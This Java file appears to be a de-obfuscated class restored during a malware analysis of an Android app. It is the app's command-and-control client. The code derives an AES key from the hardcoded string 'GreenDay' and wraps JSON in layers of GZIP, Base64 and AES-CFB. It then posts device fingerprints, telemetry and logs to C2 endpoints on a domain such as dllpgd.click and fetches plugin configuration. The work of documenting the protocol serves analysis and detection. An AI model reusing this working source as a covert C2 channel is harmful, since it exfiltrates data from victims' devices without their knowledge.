package c2;

import android.util.Base64;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.SecureRandom;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import org.json.JSONObject;

/**
 * MALWARE ANALYSIS - RESTORED FROM OBFUSCATED CLASS: c13.nim5.ez8.h5_proto.HttpGatewayClient
 *
 * Core HTTP client for C&C (Command and Control) communication.
 * Implements a five-layer encryption pipeline for all API requests:
 *
 *   Plaintext JSON
 *     → GZIP compress
 *       → Base64 encode
 *         → AES-256-CFB encrypt (with random IV)
 *           → Base64 encode
 *             → HTTP POST
 *
 * Encryption details:
 * - Algorithm: AES/CFB/NoPadding (AES-256 in CFB mode)
 * - Key derivation: MD5("GreenDay") → uppercase hex string → first 32 bytes as key
 *   (Original: IIlIllIIll1.IlIllIlllIllI1("GreenDay") computes MD5 uppercase hex)
 * - IV: Random 16 bytes prepended to ciphertext
 * - Encoding: Base64 with NO_WRAP flag (flag=2)
 *
 * API endpoints (all POST):
 * - /api/v1/dllpgd/getConfig   → fetches configuration + plugin definitions
 * - /api/v1/dllpgd/updateEvent → reports telemetry events
 * - /api/v1/dllpgd/updateLog   → uploads log entries
 *
 * HTTP headers:
 * - Content-Type: application/json
 * - User-Agent: DllpgdLiteClient/2.0
 * - Timeouts: connect=10s, read=30s
 *
 * NOTE: The aesDecryptString() static method was NOT properly decompiled by JADX
 * (dumped as raw bytecode). It has been manually reconstructed below from the
 * bytecode instructions in the original decompilation output.
 */
public class HttpGatewayClient {

    /** AES encryption key seed - MD5 of this string produces the actual 32-byte key */
    private static final String AES_KEY = "GreenDay";

    /** HTTP Content-Type header value */
    private static final String CONTENT_TYPE = "application/json";

    /** HTTP User-Agent header value */
    private static final String USER_AGENT = "DllpgdLiteClient/2.0";

    /** Base URL for all API calls (e.g., "https://dllpgd.click") */
    private final String baseUrl;

    // =========================================================================
    // Constructors
    // =========================================================================

    /**
     * Creates an HttpGatewayClient with HTTPS and default port.
     * Base URL becomes "https://{domain}"
     *
     * @param domain the C&C server domain (e.g., "dllpgd.click")
     */
    public HttpGatewayClient(String domain) {
        this.baseUrl = "https://" + domain;
    }

    /**
     * Creates an HttpGatewayClient with explicit port and protocol selection.
     * Base URL becomes "{protocol}://{domain}:{port}"
     *
     * @param domain   the C&C server domain
     * @param port     the server port
     * @param useHttps true for HTTPS, false for HTTP
     */
    public HttpGatewayClient(String domain, int port, boolean useHttps) {
        String protocol = useHttps ? "https://" : "http://";
        this.baseUrl = protocol + domain + ":" + port;
    }

    // =========================================================================
    // AES Encryption / Decryption
    // =========================================================================

    /**
     * Derives the 32-byte AES key from AES_KEY.
     * Process: MD5("GreenDay") → uppercase hex → getBytes("UTF-8") → pad/truncate to 32 bytes.
     *
     * Original obfuscated call: IIlIllIIll1.IlIllIlllIllI1(AES_KEY) → MD5 uppercase hex
     */
    private static byte[] deriveAesKeyBytes() throws Exception {
        // IIlIllIIll1.IlIllIlllIllI1(AES_KEY) computes MD5("GreenDay") and returns uppercase hex
        // The result is a 32-char hex string, which when encoded as UTF-8 gives exactly 32 bytes
        String md5Hex = computeMD5UpperHex(AES_KEY);
        byte[] keyBytes = md5Hex.getBytes("UTF-8");
        if (keyBytes.length > 32) {
            byte[] trimmed = new byte[32];
            System.arraycopy(keyBytes, 0, trimmed, 0, 32);
            return trimmed;
        } else if (keyBytes.length < 32) {
            byte[] padded = new byte[32];
            System.arraycopy(keyBytes, 0, padded, 0, keyBytes.length);
            return padded;
        }
        return keyBytes;
    }

    /**
     * Computes MD5 hash of input string and returns as uppercase hexadecimal.
     * This is the restored version of IIlIllIIll1.IlIllIlllIllI1().
     */
    private static String computeMD5UpperHex(String input) throws Exception {
        java.security.MessageDigest md = java.security.MessageDigest.getInstance("MD5");
        byte[] digest = md.digest(input.getBytes("UTF-8"));
        StringBuilder sb = new StringBuilder();
        for (byte b : digest) {
            sb.append(String.format("%02X", b & 0xFF));
        }
        return sb.toString();
    }

    /**
     * Decrypts data using AES-256-CFB with the derived key.
     * Input format: [16-byte IV][ciphertext]
     *
     * @param data the encrypted data (IV + ciphertext)
     * @return the decrypted plaintext bytes
     */
    private byte[] aesDecrypt(byte[] data) throws Exception {
        byte[] keyBytes = deriveAesKeyBytes();
        SecretKeySpec keySpec = new SecretKeySpec(keyBytes, "AES");

        // Extract 16-byte IV from the beginning
        byte[] iv = new byte[16];
        System.arraycopy(data, 0, iv, 0, 16);
        IvParameterSpec ivSpec = new IvParameterSpec(iv);

        // Extract ciphertext (everything after IV)
        int ciphertextLen = data.length - 16;
        byte[] ciphertext = new byte[ciphertextLen];
        System.arraycopy(data, 16, ciphertext, 0, ciphertextLen);

        Cipher cipher = Cipher.getInstance("AES/CFB/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);
        return cipher.doFinal(ciphertext);
    }

    /**
     * Encrypts data using AES-256-CFB with the derived key and a random IV.
     * Output format: [16-byte random IV][ciphertext]
     *
     * @param data the plaintext bytes to encrypt
     * @return the encrypted data (IV + ciphertext)
     */
    private byte[] aesEncrypt(byte[] data) throws Exception {
        byte[] keyBytes = deriveAesKeyBytes();
        SecretKeySpec keySpec = new SecretKeySpec(keyBytes, "AES");

        // Generate random 16-byte IV
        byte[] iv = new byte[16];
        new SecureRandom().nextBytes(iv);
        IvParameterSpec ivSpec = new IvParameterSpec(iv);

        Cipher cipher = Cipher.getInstance("AES/CFB/NoPadding");
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);
        byte[] encrypted = cipher.doFinal(data);

        // Prepend IV to ciphertext
        byte[] result = new byte[encrypted.length + 16];
        System.arraycopy(iv, 0, result, 0, 16);
        System.arraycopy(encrypted, 0, result, 16, encrypted.length);
        return result;
    }

    /**
     * Encrypts a string using AES-256-CFB and returns Base64-encoded result.
     *
     * Pipeline: plaintext → UTF-8 bytes → AES-CFB encrypt (with random IV) → Base64(NO_WRAP)
     *
     * @param plaintext the string to encrypt
     * @return Base64-encoded encrypted string
     */
    public static String aesEncryptString(String plaintext) throws Exception {
        byte[] keyBytes = deriveAesKeyBytes();
        SecretKeySpec keySpec = new SecretKeySpec(keyBytes, "AES");

        // Generate random 16-byte IV
        byte[] iv = new byte[16];
        new SecureRandom().nextBytes(iv);
        IvParameterSpec ivSpec = new IvParameterSpec(iv);

        Cipher cipher = Cipher.getInstance("AES/CFB/NoPadding");
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);
        byte[] encrypted = cipher.doFinal(plaintext.getBytes("UTF-8"));

        // Prepend IV to ciphertext
        byte[] result = new byte[encrypted.length + 16];
        System.arraycopy(iv, 0, result, 0, 16);
        System.arraycopy(encrypted, 0, result, 16, encrypted.length);

        return Base64.encodeToString(result, Base64.NO_WRAP);
    }

    /**
     * RECONSTRUCTED FROM BYTECODE - JADX failed to decompile this method.
     *
     * Decrypts a Base64-encoded AES-256-CFB encrypted string.
     *
     * Pipeline: Base64 string → decode(NO_WRAP) → extract IV (first 16 bytes)
     *           → AES-CFB decrypt → new String(bytes, "UTF-8")
     *
     * @param encrypted the Base64-encoded encrypted string
     * @return the decrypted plaintext string
     * @throws IllegalArgumentException if the decoded data is shorter than 16 bytes (no IV)
     */
    public static String aesDecryptString(String encrypted) throws Exception {
        byte[] keyBytes = deriveAesKeyBytes();
        SecretKeySpec keySpec = new SecretKeySpec(keyBytes, "AES");

        // Base64 decode with NO_WRAP flag
        byte[] data = Base64.decode(encrypted, Base64.NO_WRAP);

        if (data.length < 16) {
            throw new IllegalArgumentException(
                    "Encrypted data too short, must be at least 16 bytes for IV");
        }

        // Extract 16-byte IV
        byte[] iv = new byte[16];
        System.arraycopy(data, 0, iv, 0, 16);
        IvParameterSpec ivSpec = new IvParameterSpec(iv);

        // Extract ciphertext
        int ciphertextLen = data.length - 16;
        byte[] ciphertext = new byte[ciphertextLen];
        System.arraycopy(data, 16, ciphertext, 0, ciphertextLen);

        Cipher cipher = Cipher.getInstance("AES/CFB/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);
        byte[] decrypted = cipher.doFinal(ciphertext);

        return new String(decrypted, "UTF-8");
    }

    // =========================================================================
    // GZIP Compression / Decompression
    // =========================================================================

    /**
     * GZIP-compresses the given byte array.
     */
    private byte[] gzipCompress(byte[] data) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (GZIPOutputStream gzip = new GZIPOutputStream(baos)) {
            gzip.write(data);
        }
        return baos.toByteArray();
    }

    /**
     * GZIP-decompresses the given byte array.
     */
    private byte[] gzipDecompress(byte[] data) throws IOException {
        try (GZIPInputStream gzip = new GZIPInputStream(new ByteArrayInputStream(data))) {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[8192];
            int read;
            while ((read = gzip.read(buffer)) != -1) {
                baos.write(buffer, 0, read);
            }
            return baos.toByteArray();
        }
    }

    // =========================================================================
    // HTTP Communication
    // =========================================================================

    /**
     * Sends an HTTP POST request with the given body to baseUrl + path.
     *
     * Headers set:
     * - Content-Type: application/json
     * - User-Agent: DllpgdLiteClient/2.0
     * - Content-Length: <body length>
     * - Connect timeout: 10 seconds
     * - Read timeout: 30 seconds
     *
     * @param path the API path (e.g., "/api/v1/dllpgd/getConfig")
     * @param body the request body bytes
     * @return the response body bytes
     */
    private byte[] sendHttpRequest(String path, byte[] body) throws IOException {
        HttpURLConnection connection = (HttpURLConnection) new URL(this.baseUrl + path).openConnection();
        try {
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setUseCaches(false);
            connection.setRequestProperty("Content-Type", CONTENT_TYPE);
            connection.setRequestProperty("User-Agent", USER_AGENT);
            connection.setRequestProperty("Content-Length", String.valueOf(body.length));
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(30000);

            // Write request body
            try (OutputStream os = connection.getOutputStream()) {
                os.write(body);
                os.flush();
            }

            int responseCode = connection.getResponseCode();
            if (responseCode != 200) {
                // Read error response
                String errorBody = "";
                InputStream errorStream = connection.getErrorStream();
                if (errorStream != null) {
                    try {
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        byte[] buffer = new byte[1024];
                        int read;
                        while ((read = errorStream.read(buffer)) != -1) {
                            baos.write(buffer, 0, read);
                        }
                        errorBody = new String(baos.toByteArray(), "UTF-8");
                    } finally {
                        errorStream.close();
                    }
                }
                throw new IOException("HTTP request failed with code: " + responseCode
                        + ", error: " + errorBody);
            }

            // Read success response
            try (InputStream is = connection.getInputStream()) {
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                byte[] buffer = new byte[8192];
                int read;
                while ((read = is.read(buffer)) != -1) {
                    baos.write(buffer, 0, read);
                }
                return baos.toByteArray();
            }
        } finally {
            connection.disconnect();
        }
    }

    // =========================================================================
    // API Call Methods (with encryption pipeline)
    // =========================================================================

    /**
     * Makes an encrypted API call using the full five-layer pipeline.
     *
     * Encryption pipeline:
     *   JSON.toString() → UTF-8 bytes → GZIP → Base64 → AES-256-CFB → Base64 → HTTP POST
     *
     * Response is returned as a raw JSONObject (server response is not encrypted).
     *
     * @param path the API path
     * @param payload the JSON payload to send
     * @return the server's JSON response
     */
    private JSONObject callAPI(String path, JSONObject payload) throws Exception {
        String jsonStr = payload.toString();
        // Five-layer encryption pipeline:
        // 1. JSON string → UTF-8 bytes
        byte[] jsonBytes = jsonStr.getBytes("UTF-8");
        // 2. GZIP compress
        byte[] compressed = gzipCompress(jsonBytes);
        // 3. Base64 encode
        String base64Compressed = Base64.encodeToString(compressed, Base64.NO_WRAP);
        // 4. AES-256-CFB encrypt → Base64 encode
        String encrypted = aesEncryptString(base64Compressed);
        // 5. Send as HTTP POST body
        byte[] requestBody = encrypted.getBytes("UTF-8");
        byte[] responseBytes = sendHttpRequest(path, requestBody);
        return new JSONObject(new String(responseBytes, "UTF-8"));
    }

    /**
     * Makes a plaintext (unencrypted) API call - JSON sent directly without encryption.
     *
     * @param path the API path
     * @param payload the JSON payload to send
     * @return the server's JSON response
     */
    private JSONObject callAPIPlaintext(String path, JSONObject payload) throws Exception {
        String jsonStr = payload.toString();
        byte[] requestBody = jsonStr.getBytes("UTF-8");
        byte[] responseBytes = sendHttpRequest(path, requestBody);
        return new JSONObject(new String(responseBytes, "UTF-8"));
    }

    // =========================================================================
    // Public API Methods
    // =========================================================================

    /**
     * Fetches configuration from the C&C server.
     * Endpoint: POST /api/v1/dllpgd/getConfig
     *
     * @param atomJson the device fingerprint (Atom) as a JSONObject
     * @return the server's response containing DllpgdConfig
     */
    public JSONObject getConfig(JSONObject atomJson) throws Exception {
        JSONObject requestJson = new JSONObject();
        requestJson.put("atom", atomJson);
        return callAPI("/api/v1/dllpgd/getConfig", requestJson);
    }

    /**
     * Reports telemetry events to the C&C server.
     * Endpoint: POST /api/v1/dllpgd/updateEvent
     *
     * @param request the event update request containing Atom + events list
     * @return CommonResponse with status code and message
     */
    public CommonResponse updateEvent(UpdateEventRequest request) throws Exception {
        return CommonResponse.fromJSONObject(
                callAPI("/api/v1/dllpgd/updateEvent", request.toJSONObject()));
    }

    /**
     * Uploads log entries to the C&C server.
     * Endpoint: POST /api/v1/dllpgd/updateLog
     *
     * @param request the log update request containing Atom + log entries
     * @return CommonResponse with status code and message
     */
    public CommonResponse updateLog(UpdateLogRequest request) throws Exception {
        return CommonResponse.fromJSONObject(
                callAPI("/api/v1/dllpgd/updateLog", request.toJSONObject()));
    }
}
